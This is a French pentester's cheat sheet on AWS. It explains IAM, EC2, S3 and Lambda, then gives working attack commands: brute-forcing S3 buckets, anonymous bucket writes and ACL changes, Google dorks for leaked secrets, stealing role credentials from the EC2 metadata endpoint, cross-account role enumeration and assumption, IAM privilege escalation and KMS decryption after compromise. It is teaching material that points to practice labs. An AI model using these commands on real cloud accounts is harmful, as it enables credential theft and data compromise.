# AWS

## Amazon Web Services

1. [Introduction-AWS](./#Introduction-AWS)
   1. [Service Identity and Access Management - IAM](./#Service-Identity-and-Access-Management---IAM)
      1. [Entités](./#Entités)
      2. [Politiques de sécurité](./#Politiques-de-sécurité)
         1. [Inline](./#Inline)
         2. [Attached](./#Attached)
      3. [Authentification à AWS](./#Authentificaiton-à-AWS)
      4. [Interaction avec AWS](./#Interaction-avec-AWS)
         1. [awscli](./#awscli)
   2. [Service Elastic Compute Cloud - EC2](./#Service-Elastic-Compute-Cloud---EC2)
   3. [Service Elastic Container Service - ECS](./#Service-Elastic-Container-Service---ECS)
   4. [Service Elastic Container Registry - ECR](./#Service-Elastic-Container-Registry---ECR)
   5. [Service Simple Storage Service - S3](./#Service-Simple-Storage-Service---S3)
   6. [Service Security Token Service - STS](./#Service-Security-Token-Service---STS)
   7. [Service Lambda](./#Service-Lambda)
2. [Exploitation AWS](./#Exploitation-AWS)
   1. [Bucket S3](./#Bucket-S3)
      1. [Identification](./#Identification)
      2. [Compromission](./#Compromission)
         1. [Lecture](./#Lecture)
         2. [Ecriture](./#Ecriture)
   2. [Compromission des VM Elastic Compute Cloud](./#Compromission-des-VM-Elastic-Compute-Cloud)
      1. [Identification](./#Identification)
      2. [Compromission](./#Compromission)
      3. [Exploitation](./#Exploitation)
         1. [Les métadonnées d’une instance](./#Les-métadonnées-d’une-instance)
   3. [Les fonctions lambda](./#Les-fonctions-lambda)
   4. [Usurper un rôle](./#Usurper-un-rôle)
      1. [Priviléges](./#Priviléges)
      2. [Enumeration des rôles](./#Enumeration-des-rôles)
      3. [Usurpation du rôle](./#Usurpation-du-rôle)
3. [Elevation de privilege](./#Elevation-de-privilege)
   1. [Exploitation manuelle](./#Exploitation-manuelle)
      1. [Ajouter un utilisateur à un groupe](./#Ajouter-un-utilisateur-à-un-groupe)
   2. [Exploitation automatique](./#Exploitation-automatique)
4. [Post-Exploitation](./#Post-Exploitation)
5. [Bibliographie](./#Bibliographie)
6. [Entrainement](./#Entrainement)

## Introduction AWS

* Ecosystéme d'infrastructure complexe. Sa compléxité entraîne la présence de défaut de configuration permettant une exploitation. De nombreuses entreprises l'utilisent pour y stocker leur SI. Il est possible de lier les identités d'un domaine Windows (AD) avec celles de l'environnement AWS.
* L'identifiant d'un environnement AWS est une information privée, mais qui peut être retrouvé à travers une étape d'OSINT

### Service Identity and Access Management - IAM

Le service de sécurité principal est le Gestionnaire d’Identités et d’Accès. IAM permet de gérer les permissions des services AWS.

#### Entités

Il existe 2 types d'entités

* **Identités** :
  * **Utilisateur**
  * **Groupe**
  * **Rôle**
    * Ensemble de permissions pouvant être accordé à une entité. Un rôle peut être temporaire et donc permettre à une entité d'obtenir des fonctions non persistantes.
    *   Chaque rôle posséde une relation d'approbation permettant d'indiquer les utilisateurs qui peuvent endosser ce rôle

        * Définis au format JSON
        * Il est possible d'associer un utilisateur d'un environnement X à un rôle présent dans un environnement Y

        ```
        {
            "Version": "<version>",
            "Statement": [
                {
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": "arn:aws:<service>::<numero-aws>:<entite>"
                    },
                    "Action": "sts:AssumeRole"
                }
            ]
        }
        ```
* **Ressources** : Element pouvant être utilisé (machine virtuelle, espace de stockage, clés ...)
  * Une ressource peut en utiliser une autre (nécessite une autorisation explicite)

#### Politiques de sécurité

Tous les accés sont encadrés par une politique de sécurité. Une politique de sécurité est rattaché à une entité.

Elles sont définis sous format JSON :

```
{
    "Version": "<AAAA-MM-JJ>",
    "Statement": [
        {
        "Sid": "<description>",
        "Effect": "<Allow|Deny>",
        "Action": ["<service>:<action>"],
        "Resource": "arn:aws:<service>::<numero-de-compte>:<element-designe>"
        }
    ]
}
```

Une politique de sécurité peut contenir plusieurs `Statement` et à pour `Effect` d'autorisé/d'interdire une `Action` pour une `Resource` donnée dans une `Condition` donné (facultatif).

Les `Resource` sont désignées en utilisant `Amazon Ressource Name` (ARN)

* `ARN` qui permet de désigner un élement de l'environnement AWS (entité, politique de sécurité, clé ...)
  * `ARN` se présente sous la forme `<service>::<numero-de-compte>:<element-designe>`

**Inline**

* Définition : _Une **stratégie en ligne** est une stratégie qui est **intégrée** à une **entité mandataire** (utilisateur, groupe ou rôle), elle **fait partie intégrante de l'entité** mandataire_

**Attached**

* Définition : _Une stratégie autonome, signifie qu'elle a **son propre Amazon Resource Name (ARN)**. Elles peuvent être gérés par AWS ou votre propre compte AWS. Vous pouvez ensuite les **attacher à plusieurs entités mandataires** de votre compte AWS_

#### Authentification à AWS

Il existe 3 types d'authentification à AWS

* Couple identifiant/mot de passe
* Couple de clés d'API Access Key ID/Secret Access Key ID
* Couple de Access Key/Session Key

#### Interaction avec AWS

Il existe 3 moyens de communiquer avec un environnement AWS, tous utilise la même API :

* Une application web
* Une API boto3
* Une interface en ligne de commande `awscli`
  * `pip3 install awscli`
  * `aws --version`
  * `aws configure`

**awscli**

* L'execution de commande via `awscli` utilise la structure `aws $service $appel $arguments`
  * Exemple : `aws iam list-groups`
*   Exemple de services : iam, s3, s3api, lambda, sts, apigateway

    \

* Configurer un compte : `aws configure --profile freeuser`

```
AWS Access Key ID [None]: XXXXX
AWS Secret Access Key [None]: XXXXX
Default region name [None]: 
Default output format [None]: 
```

* Les comptes peuvent être configurés à travers le fichier `~/.aws/credentials`

```
[default]
aws_access_key_id = XXXXX
aws_secret_access_key = XXXXX
[freeuser]
aws_access_key_id = XXXXX
aws_secret_access_key = XXXXX
```

### Service Elastic Compute Cloud - EC2

* Capacité de calcul sécurisée et redimensionnable. Conçu pour faciliter l'accès aux ressources de cloud computing
* Les VM EC2 peuvent être exposées sur Internet, leur administration n'est pas la reponsabilité de AWS
* Une instance EC2 exposée publiquement posséde un **hostname** et un **enregistrement DNS de type PTR (Pointer Record)** associant l'IP au hostname.
* Le hostname est de la forme `ec2-<IP>.<region>.compute.amazonaws.com`
* Les instances EC2 récupérent les identifiants pour leur rôles IAM depuis le service de metadata 169.254.169.254
  * Adresse IP de lien local
  * Accessibles que depuis l’instance concernée
  * Contiennent des informations relatives à la configuration/environnement (clés API, tokens temporaires ...)
  * Ces éléments permettrait de réaliser des actions dans le contexte de l'instance dans l’environnement cible

### Service Elastic Container Registry - ECR

* **Registre de conteneurs** Docker pour **stocker, gérer et déployer** les conteneurs Docker
* Conteneur : _Les conteneurs fournissent un moyen standard de joindre le code, les configurations et les dépendances de votre application en un seul objet. Les conteneurs partagent un système d'exploitation installé sur le serveur et s'exécutent en tant que processus à ressources isolées, assurant des déploiements rapides, fiables et cohérents, quel que soit l'environnement_

### Service Elastic Container Service - ECS

* **Orchestration de conteneurs** pour **exécuter** facilement des applications conteneurisées
  * Les containers lancé par ECS dans AWS possédent leurs identifiants `169.254.170.2/v2/credentials/GUID`
    * GUID est présent dans la variable d'environment `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`

### Service Simple Storage Service - S3

* **Stockage de données** (sites web, des applications mobiles, la sauvegarde et la restauration, l'archivage)
* Bucket : Offre de stockage d’objets d’AWS
  * Un bucket correspond à une instance de stockage dont l'accés est réglementé
* Quand un site est hébergé sur un bucket S3 le nom du bucket correspond au nom de domaine
* Le nom du bucket S3 ne peut pas être utilisé par plusieurs personnes
* Il existe 2 types d'autorisations pour les buckets S3 :
  * Au niveau du bucket lui-même
    * Lister les objets
    * Déposer/supprimer des objets dans le bucket
    * Lire les autorisations
    * Modifier les autorisations
  * Au niveau des objets qu’il contient
    * Lire l’objet
    * Lire les autorisations de l’objet
    * Modifier les autorisations de l’objet

### Service Security Token Service - STS

### Service Lambda

## Exploitation AWS

https://github.com/NetSPI/AWSSigner

### Bucket S3

#### Identification

* Une attaque par brute froce permet d'identifier les buckets existants
  * Les bucket sont accessible à travers des URL de ce format `http://<nom>.s3.amazonaws.com`
  * Une réponse est renvoyé dans tous les cas
    * Erreur du type `NoSuchBucket`
    * Informations au sujet du bucket

L'outil slurp (https://github.com/0xbharath/slurp) permet d'énumérer de façon automatique

#### Compromission

**Lecture**

* Lister les objets : `aws s3 ls s3://<bucket-name>/ --no-sign-request`
  * `--no-sign-request` réalise la requête de manière anonyme
* Récupérer un objet : `aws s3 cp s3://<bucket-name>/<objet> . --no-sign-request`
* Lire la liste de contrôle d’accès associée à un objet `aws s3api get-object-acl --bucket <bucket-name> --key <objet> --no-sign-request`

**Ecriture**

* Ecrire un fichier dans le bucket : `aws s3 cp <fichier> s3://<bucket-name>/<fichier> --nosign-request`
* Supprimer un fichier dans le bucket : `aws s3 rm s3://<bucket-name>/<fichier> --no-sign-request`

**Attention** il est possible d'autoriser l'écriture mais pas la suppression. Pour éviter de laisser des fichiers, utiliser la fonctionnalité `multipart upload`. Elle permet de déposer un fichier volumineux en plusieurs parties, et efface automatiquement les premières parties déposées si l’opération est interrompue.

* Modifier le contrôle d'accés : `aws s3api put-object-acl --bucket <bucket-name> --key <objet> --grant-read uri=http://acs.amazonaws.com/groups/global/AllUsers --nosign-request`
  * Ajout du droit de lecture sur un objet pour tous les utilisateurs

### Compromission des VM Elastic Compute Cloud (EC2)

#### Identification

* Identifier si une cible est hébergée chez AWS : `host <IP>`

**Google dork**

* site:s3-_-_-\*.amazonaws.com filetype:sql
* Credentials, Card Numbers, Personal Details etc.
* Few other tricks:
  * site:s3-\*.amazonaws.com
  * site:s3-eu-west-1.amazonaws.com filetype:txt
  * site:s3-eu-west-1.amazonaws.com filetype:txt password
  * site:s3-eu-west-1.amazonaws.com filetype:txt pass
  * site:s3-eu-west-1.amazonaws.com filetype:txt database
  * site:s3-eu-west-1.amazonaws.com filetype:txt swagger
  * site:s3-_-_-\*.amazonaws.com AWS\_SECRET

#### Compromission

Réaliser un test d'intrusion classique sur chaque instance EC2 exposée découverte. Plusieurs vulnérabilités AWS nécessite la capacité de réaliser des **requêtes HTTP**.

Les vulnérabilités pouvant mener à exécuter des requêtes HTTP sont notamment :

* RCE
* SSRF
  * Cf : https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#ssrf-url-for-cloud-instances
* XXE

#### Exploitation

Le but est de pivoter au sein de l'environnement AWS suite à la découverte d'une vulnérabilité dans une instance EC2.

**Les métadonnées d’une instance**

* Accés aux métadonnées : `curl http://169.254.169.254/latest/meta-data/`
* Lister les rôles associés à l'instance : `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/`
  * L'abscence de retour indique l'abscence de rôle associé
* Affiche les informations sur un rôle existant : `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>`
  * Renvoie la paire de clés d’API AccessKeyId/SecretAccessKey et un jeton STS
    * **Security Token Service** (STS) fournis des jetons de session temporaires correspondant à un certain rôle. Permet un accés limité dans le temps à une entité

Aprés récupération des clés d'API et du jeton il faut les injecter dans des variables d'environnement de façon à ce que toutes les requetes `awscli` se fassent dans ce contexte :

```bash
export AWS_ACCESS_KEY_ID=XXXXX
export AWS_SECRET_ACCESS_KEY=YYYYY
export AWS_SESSION_TOKEN=ZZZZZ
```

* Récupérer des informations sur le compte `aws sts get-caller-identity`

### Les fonctions lambda

Fonctions serverless compatibles avec de divers langages de programmation

Obtiennent leur identifiants depuis les variables d'environnement

Peuvent être exposées notamment dans le cas d'un fonctionnement API

La compromission d’une fonction Lambda peut entraîner l'usurpation du rôle associé

* Les méthodes d'API sont accessible via HTTP de la façon suivante : `https://<rest-api-id>.execute-api.<region>.amazonaws.com/<etape>/<nom-fonction>`
* Réussir une exécution de commande via la fonction Lambda et exécuter la fonction `env` (Linux) ou `set` (Windows) de façon à récupérer les variables d'environnement et donc les clés API & le jeton

### Usurper un rôle

#### Priviléges

Appliquer le principe de "Least privilege". Pour auditer les priviléges :

* AWS CloudTrail : https://docs.aws.amazon.com/fr\_fr/cloudtrail/?id=docs\_gateway
* CloudTraker : find over-privileged IAM users : https://github.com/duo-labs/cloudtracker
* Repokid: remove permissions granting access to unused services from the inline policies of IAM roles in an AWS account :https://github.com/Netflix/repokid

#### Enumeration des rôles

En créant un fichier de relation d'approbation de rôle au sein de notre environnement AWS, il est possible d'énumérer les entités d'un environnement AWS dont on a connaissance de l'ID.

Il suffit d’ajouter un rôle de l’environnement cible, dans la relation d’approbation du rôle que nous avons créé dans notre environnement.

Si le rôle n'existe pas : erreur Si le rôle existe : relation d'approbation validée

Exemple de relation d'approbation :

```
{
    "Version": "<version>",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": "arn:aws:<service>::<id-numero>:<role-cible>"
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
```

* Remplacer `<role-cible>` permettra de valider/invalider l'existance du rôle sur l'environnement AWS cible
* Associer le role supposé de l'environnement cible au rôle `role-attaquant` (créé dans notre environnement d’attaquant)
  * `aws iam update-assume-role-policy --role-name role-attaquant --policy-document file://brute-force_role_policy.json`
* Si le role n'existe pas : _UpdateAssumeRolePolicy operation: Invalid principal in policy:_

#### Usurpation du rôle

L'identification du rôle n'implique pas de pouvoir l'endosser. Une configuration du type `"AWS": "*"` permettant à **toutes les entités de n'importe quel environnement AWS d'endosser ce rôle**

```
{
    "Version": "<version>",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "sts:AssumeRole"
        }
    ]
}
```

Un attaquant serait en mesure, en utilisant son propre environnement, d’endosser le rôle concerné si ce type de configuration est présente

* Endosser le rôle : `aws sts assume-role --role-arn arn:aws:iam::XXXX:role/<role-identifie> --role-session-name session`
* En cas de réussite on récupére AccessKeyID/SecretAccessKey et SessionToken

L'outil assume\_role\_enum.py (https://github.com/RhinoSecurityLabs/Security-Research/tree/master/tools/aws-pentest-tools/assume\_role\_enum) permet d'automatiser cette attaque

## Elevation de privilege

Les différentes techniques reposent sur des défauts de configuration du service IAM

### Exploitation manuelle

* Lister les politiques de sécurité associées au role : `aws iam list-role-policies --role-name <role>`
* Lire le contenus d'une politique de sécurité : `aws iam get-role-policy --role-name <role> --policy-name <nom-politique>`
  * Exemple de droits :
    * `s3:ListBucket` : lister le contenu
    * `s3:GetObject` : lire les objets
      * Une ressource du type : `arn:aws:s3:::<bucket-name>/*` permet de récupérer le contenus de tous les objets
    * `iam:AddUserToGroup` : ajouter un utilisateur à un groupe
    * `iam:ListGroups` : liste des groupes
      * Lister les groupes : `aws iam list-groups`

#### Ajouter un utilisateur à un groupe

**Prérequis** : L'attaquant est en possession d'un compte sur l'environnement cible possédant la permission `iam:AddUserToGroup`

* Ajout de l'utilisateur au groupe : `aws iam add-user-to-group --user-name <user> --group-name <groupe>`
* Lister les permissions associées au groupe : `aws iam list-attached-group-policies --group-name <groupe>`
  * La permission `AdministratorAccess` est la plus privilégiée de l'environnement AWS

### Exploitation automatique

* Framework pacu (https://github.com/RhinoSecurityLabs/pacu) permet de faire de la reconnaissance, de l'exploitation, et de la post-exploitation
  * Indiquer les clés API : `set_keys`
  * Module d’élévation de privilèges : `run iam__privesc_scan`
  * Liste des permissions de l'utilisateur : `run iam__enum_permissions`
  * Lister les groupes disponibles : `run iam__enum_users_roles_policies_groups`
* aws\_escalate.py (https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/aws-pentest-tools/aws\_escalate.py)
  * `python3 .\aws_escalate.py --all-users --access-key-id <ACCESS_KEY_ID> --secret-key <SECRET_KEY>`
    * Génére un fichier .CSV indiquant pour chaque utilisateur de l'environnement AWS cible s'il posséde l'une des permissions vulnérables à une élévation de privilége
* https://github.com/Static-Flow/CloudCopy

## Post-Exploitation

Suite à une escalation de privilége des ressources sensibles sont rendus accessible.

Le **Key Management Service** (KMS) est le gestionnaire de clés de chiffrement d’AWS, il génére les clés de chiffrement. Les S3 sont chiffrés via les clés de chiffrement du KMS

L’utilisation de ces clés est régie par des politiques de sécurité

* Lister les clés de chiffrement : `aws kms list-keys`
* Description d'une clé de chiffrement : `aws kms describe-key --key-id XXXX-XXXX-XXXX-XXXX`
* Afficher la politique de sécurité attachée à une clé : `aws kms list-key-policies --key-id XXXX-XXXX-XXXX-XXXX`
* Déchiffrer le fichier chiffré : `aws kms decrypt --ciphertext-blob fileb://<fichier>.enc --output text --query`
  * KMS sait d’associer un texte chiffré à la clé correspondante

## Bibliographie

* MISC 105 - Dossier : Sécurité des environnements cloud AWS
* https://docs.aws.amazon.com

## Entrainement

* http://flaws.cloud
  * Write-up : https://github.com/s-lck/WholePentesterGuides/web/AWS/Flaws-Challenges.md
* http://flaws2.cloud
  * Write-up : https://github.com/s-lck/WholePentesterGuides/web/AWS/Flaws2-Challenges.md
* https://github.com/RhinoSecurityLabs/cloudgoat
* https://github.com/m6a-UdS/dvca
